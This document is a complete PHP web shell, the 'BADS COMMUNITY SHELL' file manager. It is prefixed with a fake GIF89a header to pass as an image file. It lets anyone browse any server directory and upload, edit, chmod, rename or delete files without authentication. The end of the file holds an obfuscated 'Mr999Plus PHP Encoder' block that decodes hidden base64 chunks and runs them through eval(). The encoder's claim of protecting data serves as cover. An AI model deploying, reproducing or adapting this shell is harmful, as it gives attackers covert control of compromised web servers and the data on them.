<?php
/* GIF89a */

$home = $_SERVER['HOME'] ?? '/';
$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path || !is_dir($path)) $path = getcwd();
$uploadSuccess = false;
$fileLink = '';
$currentYear = date("Y");
$editContent = '';
$editTarget = '';

function h($str) { return htmlspecialchars($str, ENT_QUOTES); }

// Handle Upload
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['upload'])) {
        $dest = $path . '/' . basename($_FILES['upload']['name']);
        if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
            $uploadSuccess = true;
            $fileLink = basename($dest);
        }
    } elseif (isset($_POST['chmod'], $_POST['file'])) {
        chmod($path . '/' . $_POST['file'], intval($_POST['chmod'], 8));
    } elseif (isset($_POST['savefile'], $_POST['filename'])) {
        file_put_contents($path . '/' . $_POST['filename'], $_POST['savefile']);
    } elseif (isset($_POST['rename'], $_POST['oldname'])) {
        rename($path . '/' . $_POST['oldname'], $path . '/' . $_POST['rename']);
    }
}

// Handle Edit
if (isset($_GET['edit'])) {
    $editTarget = basename($_GET['edit']);
    $editPath = $path . '/' . $editTarget;
    if (is_file($editPath)) {
        $editContent = htmlspecialchars(file_get_contents($editPath));
    }
}

// Handle Delete
if (isset($_GET['delete'])) {
    $target = $path . '/' . basename($_GET['delete']);
    if (is_file($target)) {
        unlink($target);
        header("Location: ?path=" . urlencode($path));
        exit;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>📁BADS COMMUNITY SHELL📁</title>
    <style>
        body { background: #111; color: #eee; font-family: monospace; padding: 20px; }
        a { color: #6cf; text-decoration: none; }
        a:hover { text-decoration: underline; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #1c1c1c; }
        th, td { padding: 8px; border: 1px solid #333; text-align: left; }
        th { background: #2a2a2a; }
        input, button, textarea {
            background: #222; color: #eee; border: 1px solid #444; padding: 5px;
            border-radius: 4px; font-family: monospace;
        }
        button { background: #6cf; color: #000; font-weight: bold; cursor: pointer; }
        .breadcrumb a { color: #ccc; margin-right: 5px; }
        .breadcrumb span { color: #888; margin: 0 4px; }
        .card { background: #1c1c1c; padding: 15px; border-radius: 8px; box-shadow: 0 0 10px #000; margin-top: 20px; }
        textarea { width: 100%; height: 300px; margin-top: 10px; }
        footer { text-align: center; margin-top: 40px; color: #666; font-size: 0.9em; }
    </style>
    <?php if ($uploadSuccess): ?>
    <script>alert("✅ File uploaded successfully!");</script>
    <?php endif; ?>
</head>
<body>

<h2>📁 File Manager By BADS Community</h2>

<!-- Change Directory -->
<form method="get">
    <label>📂 Change Directory:</label>
    <input type="text" name="path" value="<?= h($path) ?>" style="width:60%;">
    <button type="submit">Go</button>
</form>

<!-- Breadcrumbs -->
<div class="breadcrumb">
    <?php
    $crumbs = explode('/', trim($path, '/'));
    $accum = '';
    echo '<a href="?path=/">/</a>';
    foreach ($crumbs as $crumb) {
        $accum .= '/' . $crumb;
        echo '<span>/</span><a href="?path=' . urlencode($accum) . '">' . h($crumb) . '</a>';
    }
    echo '<span>/</span><a href="?path=' . urlencode($home) . '">[ HOME ]</a>';
    ?>
</div>

<!-- Parent Dir -->
<?php if (dirname($path) !== $path): ?>
<p><a href="?path=<?= urlencode(dirname($path)) ?>">⬅️ [ PARENT DIR ]</a></p>
<?php endif; ?>

<!-- Upload -->
<div class="card">
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="upload" required>
        <button type="submit">📤 Upload</button>
    </form>
    <?php if ($fileLink): ?>
        <p><b>Link:</b> <a href="<?= h($fileLink) ?>" target="_blank"><?= h($fileLink) ?></a></p>
    <?php endif; ?>
</div>

<!-- Edit File -->
<?php if ($editTarget): ?>
<div class="card">
    <form method="post">
        <input type="hidden" name="filename" value="<?= h($editTarget) ?>">
        <textarea name="savefile"><?= $editContent ?></textarea><br>
        <button type="submit">💾 Save</button>
    </form>
</div>
<?php endif; ?>

<!-- File List -->
<div class="card">
    <table>
        <tr>
            <th>Name</th><th>Size (kB)</th><th>Modified</th><th>Year</th><th>Perms</th><th>Actions</th>
        </tr>
        <?php
        $items = scandir($path);
        $dirs = $files = [];

        foreach ($items as $item) {
            if ($item === '.') continue;
            if (is_dir($path . '/' . $item)) {
                $dirs[] = $item;
            } else {
                $files[] = $item;
            }
        }

        $all = array_merge($dirs, $files);

        foreach ($all as $item) {
            $full = $path . '/' . $item;
            $isDir = is_dir($full);
            $perm = substr(sprintf('%o', fileperms($full)), -4);
            $mtime = filemtime($full);
            $size = $isDir ? '-' : round(filesize($full) / 1024, 2);
            $year = date("Y", $mtime);
            $date = date("Y-m-d H:i:s", $mtime);

            echo '<tr>';
            echo '<td>';
            echo $isDir ? '<a href="?path=' . urlencode($full) . '">📁 ' . h($item) . '</a>' : '📄 ' . h($item);
            echo '</td>';
            echo "<td>$size</td><td>$date</td><td>$year</td>";
            echo '<td>
                <form method="post" style="display:inline;">
                    <input type="hidden" name="file" value="' . h($item) . '">
                    <input type="text" name="chmod" value="' . $perm . '" size="4">
                    <button>Set</button>
                </form>
            </td>';
            echo '<td>';
            if (!$isDir) {
                echo '<a href="?path=' . urlencode($path) . '&edit=' . urlencode($item) . '">✏️ Edit</a> | ';
                echo '<a href="?path=' . urlencode($path) . '&delete=' . urlencode($item) . '" onclick="return confirm(\'Delete?\')">🗑️</a> | ';
                echo '<a href="' . h($item) . '" download>⬇️</a> | ';
                echo '<form method="post" style="display:inline;">
                        <input type="hidden" name="oldname" value="' . h($item) . '">
                        <input type="text" name="rename" value="' . h($item) . '" size="10">
                        <button>✏️</button>
                    </form>';
            } else {
                echo '-';
            }
            echo '</td></tr>';
        }
        ?>
    </table>
</div>

<footer>
    © <?= $currentYear ?> | File Manager by <a href="http://t.me/h0rn3t_sp1d3r" target="_blank">@h0rn3t_sp1d3r</a>
</footer>

</body>
</html>

<?php
$O00OO00 = "
 * ============================================
 * Mr999Plus PHP Encoder Script
 * ============================================
 * 
 * ABOUT:
 * --------
 * This PHP Encoder is designed to securely encode data, shuffle characters, and manage 
 * data positions to make encoded content unreadable without a proper key. This encoder 
 * can be used for obfuscating sensitive data, protecting information from unauthorized 
 * access, and ensuring data integrity during transfer or storage.
 *
 * FEATURES:
 * ----------
 * - Encode strings into mixed and shuffled formats.
 * - Remove duplicate data entries automatically.
 * - Generate a key for decoding the encoded data back to its original format.
 * - Flexible design to support various data formats and encoding requirements.
 *
 * DEVELOPER INFO:
 * ----------------
 * Developer: Samiul Alim
 * Version: 1.0
 * Date: 2025-03-05
 * 
 * CONTACT:
 * ---------
 * - Email: samiulalim1230@gmail.com
 * - Telegram: https://t.me/samiulalim1230
 * - GitHub: https://github.com/samiulalim1/
 * - Telegram Channel: https://t.me/mr999plus
 *
 * LICENSE:
 * ---------
 * This script is licensed under the MIT License. You are free to modify, distribute, and 
 * use this script with proper attribution to the developer.
 *
 * DISCLAIMER:
 * ------------
 * This encoder is provided as-is without any warranties. The developer is not responsible 
 * for any misuse or data loss resulting from the use of this script.
 *
 * ENCODER ID : [JZQ5j-39992e5c79-MjAyNS0wMy0wNSAwMTo1MjozMg-cd172]
 * 
 * ============================================
";

$O00OO00 = str_replace(["\r\n", "\n", "\r"], "**", $O00OO00);
$OO0O0O0 = $O00OO00[1523].$O00OO00[145].$O00OO00[1524].$O00OO00[507];
$OO0O0O0 .= $O00OO00[54].$O00OO00[76].$O00OO00[144].$O00OO00[965].$O00OO00[1525];
$OO0O0O0 .= $O00OO00[76].$O00OO00[144].$O00OO00[964].$O00OO00[54].$O00OO00[79].$O00OO00[144];
$OO00000 = $O00OO00[817].$O00OO00[426].$O00OO00[275].$O00OO00[60].$O00OO00[54].$O00OO00[275];
$OOOO0O0 = $O00OO00[60].$O00OO00[817].$O00OO00[426].$O00OO00[1197].$O00OO00[60].$O00OO00[817];
$OOOO0O0 .= $O00OO00[426].$O00OO00[1525].$O00OO00[305].$O00OO00[1523].$O00OO00[145].$O00OO00[1197];
$O00O0O0 = $O00OO00[79].$O00OO00[144].$O00OO00[964].$O00OO00[817].$O00OO00[76].$O00OO00[144].$O00OO00[964];
$O00O0O0 .= $O00OO00[143].$O00OO00[917].$O00OO00[144].$O00OO00[964].$O00OO00[54].$O00OO00[204].$O00OO00[144];
$OO0O0O0 .= $O00OO00[204].$O00OO00[512].$O00OO00[79].$O00OO00[144].$O00OO00[964].$O00OO00[512].$O00OO00[917];
$OOOO0O0 .= $O00OO00[1526].$O00OO00[54].$O00OO00[1527].$O00OO00[189].$O00OO00[60].$O00OO00[54].$O00OO00[275];
$OO00000 .= $O00OO00[68].$O00OO00[964].$O00OO00[1523].$O00OO00[145].$O00OO00[1524].$O00OO00[806].$O00OO00[1523];
$O00O0O0 .= $O00OO00[965].$O00OO00[54].$O00OO00[204].$O00OO00[144].$O00OO00[965].$O00OO00[817].$O00OO00[204].$O00OO00[144];
$OOOO0O0 .= $O00OO00[1525].$O00OO00[60].$O00OO00[817].$O00OO00[426].$O00OO00[141].$O00OO00[60].$O00OO00[817].$O00OO00[426];
$OO00000 .= $O00OO00[145].$O00OO00[70].$O00OO00[204].$O00OO00[1523].$O00OO00[145].$O00OO00[1524].$O00OO00[917].$O00OO00[1523];
$OO0O0O0 .= $O00OO00[144].$O00OO00[964].$O00OO00[54].$O00OO00[145].$O00OO00[144].$O00OO00[60].$O00OO00[817].$O00OO00[144].$O00OO00[54];
$O00O0O0 .= $O00OO00[964].$O00OO00[512].$O00OO00[1527].$O00OO00[1525].$O00OO00[60].$O00OO00[54].$O00OO00[275].$O00OO00[816].$O00OO00[60];
$OOOO0O0 .= $O00OO00[189].$O00OO00[60].$O00OO00[817].$O00OO00[426].$O00OO00[144].$O00OO00[60].$O00OO00[817].$O00OO00[426].$O00OO00[68].$O00OO00[60];
$O00O0O0 .= $O00OO00[817].$O00OO00[1527].$O00OO00[1197].$O00OO00[426].$O00OO00[817].$O00OO00[204].$O00OO00[144].$O00OO00[964].$O00OO00[1525].$O00OO00[1525];
$OO00000 .= $O00OO00[145].$O00OO00[1197].$O00OO00[885].$O00OO00[1523].$O00OO00[145].$O00OO00[1197].$O00OO00[965].$O00OO00[143].$O00OO00[76].$O00OO00[144].$O00OO00[883].$O00OO00[512];
/*
 * ============================================
 * Mr999Plus PHP Encoder Script
 * ============================================
*/
$OO0O0OO = $OO0O0O0.$OOOO0O0.$OO00000.$O00O0O0; $OO0O0O0 = "";
$OO0O00O = base64_decode($OO0O0OO); $O00OO0 = urldecode($OO0O00O);
$OO00OO0 = [46,45,45,5,56,5,56,5,56,5,56,5,56,23,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,3,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,17,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,16,10,0,24,2,13,47,19,43,42,30,53,29,22,18,26,65,21,62,20,12,39,4,59,66,67,8,51,60,34,49,31,28,11,25,35,55,33,7,45,1,45,45,63,58,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,57,41,45,45,45,45,44,6,45,45,45,45,45,45,45,54,61,48,36,37,45,45,45,45,45,45,45,50,45,15,38,45,45,14,40,45,52,9,45,64,5,56,5,56,5,56,5,56,5,56,32,27];
/*
 * ============================================
 * Mr999Plus PHP Encoder Script
 * ============================================
*/
$O00O0O0 = [
	"3RFUulzNBVTMXtid5h1V29yMvgGWmJWVvomawhkVzQEcRZGWwRFZsNTOvkzNVFVOxRVU1lXcax2StlHOIR1NPhzVhN1YJBDZ2RTZ",
	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI7kyXf91XkgyXfRSPf91XfRCIgACIgACIgACIgACIgACIgACIgACIgACI",
	"oBVWtJWev5WaCZ2K4lDSy50L4MDc0BXSZ5kcO9yY15GR6pWN5E2NWFjWPpWe05GUWVldttUZvkWOvUEW24WZ6Jnd3NGU6ticXtSe",
	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIg8GajVGIgACIgACIgACI",
	"llUNPtSOoZ0UIZWUwB1L0JlS4Z1RstydzNXM4UjeH1EOul0auV3c2oHbRlmQXhjTjhjWwY0LKdjMu1EUpxWR5g1b15UbDljNNpGV",
	"K0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gC",
	"f91XkACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"jFjTWFXVm10bvYVOrZ2UZhzb6RXMXRncOV2J98FJgACIgACIgACIgACIgACIgACIgACIgsTKf91XkgyXfRSPf91XkACIgACIgACI",
	"m92KoZ0Uvk3a2dnd2JFM4UmbzQ1Z4Qkaph1ZmNUTOhHMv9ER4VmQTBHU1gleN90Z3sCSFl1SNFENvpUcENkVxokU0JEeppnQjZjS",
	"981Xf91XkACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"kACIgACIgACIK0wOnw2Zq5mU5o2N4JndZlnbmhFcUZWMzcTNSBFVzkDRWN2LidjUxsiYv8CStt0Kkd3NQ50R1sSWvwkYzITO0MzM",
	"SJFTah0LzcTRvYWVVVFWYhESGxGM4M3K1ZlazUnR1YlT0AFVkhmV4knNkVDUSRFZkR2YrJldxAVM2lzLSJlUkRGZjVVVVhFWIhkR",
	"hZXNjhWS0A1K5JHR4lFTzBnYFBVZVtGOMZTNrR1Svk1cBRVODVEZvkFZVVXMHJDNlJDNjlkZHFHNnNTcygEUmZGU0AFeKZUZiZmZ",
	"UFFZyVmTRN3dOxEMYJjN5oVZyMGW2Y2SlJVWYNGOkpUWaNjT3Y0KhVUbihWMqV1Y59yQIh3ToVDa4lHeBdXWENkdPhVe1QnNW1WS",
	"gACIgACIgACIgACIgACIgACIgACIK0wOn0TRHpVaxcVWzlTMYdSPf91Xf91Xf91Xf91Xf91Xf91XkoQD7cSP9c3TwhjRK92dXllM",
	"gACIgACIgACIgACIgACIgAyOn0TUuNGaSNzYmpkMiBCIn0zXf9FJgACIgACIgACIgACIgACIgACIgAyOnonTYpVeChlY25UbiFDc",
	"gACIgACIgACIgACIgACIgACIK0wOpgyXf91Xk0zXf91Xf91XfRCI7kSKp8FJo81XkgyXf91Xf9FJo81Xf91Xf91Xf9FJ7kCKf91X",
	"gACIgACIgACIgACIgACIgACIgAyOpgyXf91XfRCIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"3V0MYZWQGl2K2h3d6NkNNJkew0ERQNkNqljbw8mZDp0S6BTVHhTWkhHRCdWShNnUXZWaWZkSJlHT4R1MWpGerFWO2hXU1MUYmlzQ",
	"rpWZoZnM1wmVVVVbudjWys0dMp0U6Z1KO5kZZNWVEFTYohHO1QUeF50ZKJTMm92N3oFekx2S5Y2bLJWV65kbRZFZVZWZzM0bygjM",
	"4AndnpHSrEjNxlUZHRkNXhka4kkUS9yKh1EWG90TrpFRXx0NudUR1oGSCNlbKZzKahHTDFEU4FzdUNVV2QnZBRjNaRFZUhVdy0UM",
	"4hzKHJDRpFnbiVVNnJncRZldxclZvFja6B1QLhjShBzU5ckMqFlUxkWQmRHapNHewRnY08yc0pkN1x0QPZ0NIlFUFdEStJFOQhGV",
	"DVDU5sGZOhjTQlkYqFjZvAlQLhGMxMTWIlleGdEerEzRaZXZ2dGWvtCdNBFUtJlNqd0TC1mR3oHRld0LaVzTQVEWrVEUIhWZzUjS",
	"K0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"apFMJNGS2h0cQhzKvgkeQhlQqJnaadWMWNmUnhXZ4hjbapWd6NjMP5GZ0pHW6pHOzZGVtRWTLRGTuJWTNZGM4MmdzJjdvEGTrokQ",
	"WFDO39kS5dXbJFHbqJ2SvcjSsREb6xmaIZ0blRWVHZHUF9Wc5x0Uk12K2QDNv9WcrYHN5J3RJZDWmZkV0lTOjZnSVJWa0QjQStiR",
	"Q9iYjhGOGdVaYFmT0llVydTSThlbZNHcwxGdG5WY00ERQFDOvVTbi1ETzcHdDVGUiZ1bydzV2hTOJdlRFNUM1Vldoh3U4UDeyI0V",
	"zVHbQlTO5IXTgcmbpRWYvx0J98FJ7ciZ05WayB3J981XkACIgACIgACI",
	"h9GSlVGWsBlRNZlQnJ3UDVkZwUUbrUETUJVeUZWWjRjev8mSthlNrUUa5FGVUJWT1t2K1pVUst2UWVjW2FjV1syVxBlch9yK1tGd",
	"0llQM90M4UDeGNHW3NTYrsGcD5WMulFOwpEeod1RYlnaL5WYzQ2M1JUdZdVM2EWbop1KPNWevAjbEJDal9iTzJ3Z1YGOtdDZxRkd",
	"CxGUwlTcq9UOsFEUDRzTvtmeF1kNDFUdthUbw9iYkNlY4kEOCVHVhZWSvtkcolUWoJDVYhERJN0TLlTM4QXcjpUdwcWd4YDZw40T",
	"q9kSGtCNwpXNRBTTtpVO5VlcQN0ZuR1VrUXWqRmcMdnWqp2MNRXS5R0ZyJncnNUQsJzLoJ0KD9UVEFWTvM1ZNhkeFBVMPZmSXxUb",
	"gACIgACIgAiCNszJycTMkNWLn1kevpWTx8GVNdXQT50dwkXT3BzUOlXQq1UL5czY1UmM5kTOzAiOElEIy9GdhN2c1ZmYPBCUIBFI",
	"rgXMxgFbOJGZ5JndlZDczEGWwFTVGRWeM52cxg3arlTeJ1EVz8COhdnWV1WaJhmYrF1UDBHOpxUWENUe3MUUBtGRLZHNklETRV2a",
	"PNETldkdVFnMlZTa5dUOx8UakdlVMZHVYBzYVxkVTFzVpNmMjtWdwUUcFREZ0JncBtSdzNkSLlmbjNFbZplNhpmS30UMMxUOyEka",
	"O9CM5kTM5kUOkFTaiVDRu5kZzkTTkNzMxYWO4gHex8SO5Q2N5UjeuBFOoh1bj5EMxEHNGRlQvMVctdzUTV0NpZHMEN2SOhGcXl3Q",
	"gACIgACIgACIgACIgACIgACIgACIgACInUGZvNWZk9FN2U2chJ2JgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"gACIgACIgACIgACIgACIgACIgACIgACIgASPf9FJgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"zoFIn0zXf91Xf9FJgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"O5marIWT3cmN4g1SrQEOiZnV05GeMlUZFB3SpBVWycHSlBndS1UbzIGR2oFVtZFc2sSUlNEcMZlZEdXNrEnTYN3LiFEWi9iY0IWb",
	"WdUS1pEWkBjVtN2J981Xf91Xf91Xf91Xf91XkACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"kACIgACIgACIK0wOp81Xf91Xf91Xf91Xf91XkgyXfRSPf91Xf91Xf91Xf91Xf9FJgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"vVmUPhkTDZHdyYFRnZVYjF0KGV0LR1mMTNjZMBjaK50MwcmZGlzVqtEcU9iSENTVKdlMUJFbzkjQ0lUaVtSVRNmNChGN3N0djV0b",
	"l9yNrATeGdjN4hjbDJWYrl1UDlmNWlVTBJzMSFlchpVR6B3dyU0ZzJENWp1dMh3L3NGcyknZQdFSyRTcsllSBtyRhp1ZlB1TyEjM",
	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgsTKf91Xf91Xf91Xf91Xf91Xf91XkgyXfRSPf91Xf91Xf91Xf91Xf91X",
	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"==wOf91Xf91Xf9FJgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"3UlQFxWO2E0budFNxFjUYJkNvYjc3VWeUpWTxEXWxUzVRRWV5cDO0YmWQ9iQxdzQ0ETbVZDM5ITTxB1LoFTVuFFdPJjctpFMkdVM",
	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgAyOgACI",
	"YdkbNNEVsd1VoN1Qst2YBtyLjZneJFFUv9mZkd3Rz52RLJ2MEVGVUVVd3hEeDFnRzsCetp3KZRGd0glYGdjarc3QSdlMrskbxFGV",
	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgAyOnonUuJGbS5mY25kMYBjVyolZKJjYn0zXf91XkACIgACIgACI",
	"yYFN3JTNx8WNWVFROdEeOlXWlFUNkFFeDd1cs5We2MUdHZDTlZ3RwxkeEZGWUdXe6FFWwAFSOJkUNFjcuxmU6VGR2o0KCJFOPp0N",
	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgszJ1Z0VaNnTyg1a1clWmpkMiBCIgAyJ",
	"U1EWYdjTillTJBFVlNHWwcUWvUkNIV1dhhGeLN3L3NWa5c3YvtUbZRlM3IGd2tiVvdWaxclewM3QRlENUp2KGh0aGFmVhZlVqJWU",
	"913OpIyO91XZk92QzRye7lycnJXQzRCKu9Wa0Nmb1ZGIuJXd0VmcigCbhZXZg4mc1RXZytXKlR2bDNHJsM3ZyF0ckgSYkJWbhx2X",
	"jFHO3tWbv9yVotiNy1WRytyc2wGNy9iVQJmbYRXQShDVYtycYlDNwVGNxh0LFR1KsplWlV2cm9mMHR1Mx5GWmpXbu9SZ2B1bYZUd",
	"NoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQD",
	"gACIgACIgACIgACIgACIgACIgACIgsTKf91Xf91Xf91Xf91Xf9FJscyXkcCKf91Xf91Xf91Xf91Xf91Xf91Xk0zXf91Xf91Xf91X",
	"fRCKf9FJ981Xf91XkACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI",
	"zAXQ1YjaMRUN4lVZwFDR1AVd2NEeadXS2dHOBR1Uyg0NrtWZYdXepVzaZRGd4Y2RilDcm5ka5JlbLlUYaNGdwc1Mid2S1ZlUuNlY",
	"49Ea4lGO2cGc4NTe4w2YSBje3p2cHZzb1V0TTRkSQx0cNNnTQ9CRK9Ua35mQThkVyRTaWRHdatCS1tiMn5mVmdUa3MDRWhHWrYlM",
	"fBibvlGdj5WdmtXKpcSYkJWbhx2XfdCKzR3cphXZf52bpR3YuVnZhgiZpBCIgACIgACIgACI7kyXf91Xf9FJo81Xk0zXf91Xf9FJ",
	"ZBFRvh1cZdFUZ12RspFa2k1b3QEeURTSVF3btVkaiN2bqpGaqhmawNGZyd1QXl1YJpmVZlUOtJ3K4lDawtiNjRGaqhGcMVDNLZXS",
	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACI7kyXf91X",
	"gACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgACIgoQDK0gCNoQDK0gCNoQDK0gCNoQDK0gCNoQD",
	"HRlbYhHWxoWaihGNwNHSXpHRW52Z2M1R380ayoXeGBDexhmcjJGcyRzVqp2Qwo1dYRzTDhHeoZDS1QHUFZHM6JmTmV0bEBXd5IXc",
	"ilFSwATNMlFVCF3KNJ1MHpWM28Gcld1do5WYzpFVW50YJ1kdx8ETXxEZGpVO0hXdvZVW4oVdGdHWnlGZXpFMkJTTOFjNL9ydkZzL",
	"ipnRw8meZhzb40Ee2syKop1dk9UexVHRzJlNkdESrE3MTRjbphXZJVmZaVTQIlFRoVDVZZWRIllepVGcuJlYwoUUI5GUC1GUaFUN"
];
/*
 * ============================================
 * Mr999Plus PHP Encoder Script
 * ============================================
*/
$OO0000 = $O00OO0[7].$O00OO0[36].$O00OO0[29];
$O00O0O = $O00OO0[3].$O00OO0[6].$O00OO0[33].$O00OO0[30];
$O0OO00 = $O00OO0[30].$O00OO0[22].$O00OO0[24].$O00OO0[26].$O00OO0[24];
$OO0O00 = $O0OO00[0].$O00OO0[18].$O00OO0[3].$O0OO00[0].$O0OO00[1].$O00OO0[24];
$O00O00 = $O00O0O[2].$O00OO0[10].$O0OO00[2].$O00OO0[24].$O0OO00[0].$O00OO0[9];
$O00O0O.= $O0OO00[1].$OO0000[1].$OO0000[2].$O0OO00[3].$O00O0O[3].$O00OO0[32].$O00OO0[35].$O00OO0[26].$OO0O00[3]; 
/*
 * ============================================
 * Mr999Plus PHP Encoder Script
 * ============================================
*/

foreach($OO00OO0 as $OO00O0O){$OO0O0O0 .= $O00O0O0[$OO00O0O];}
eval($O00O0O($O00O00($OO0O0O0)));

?>

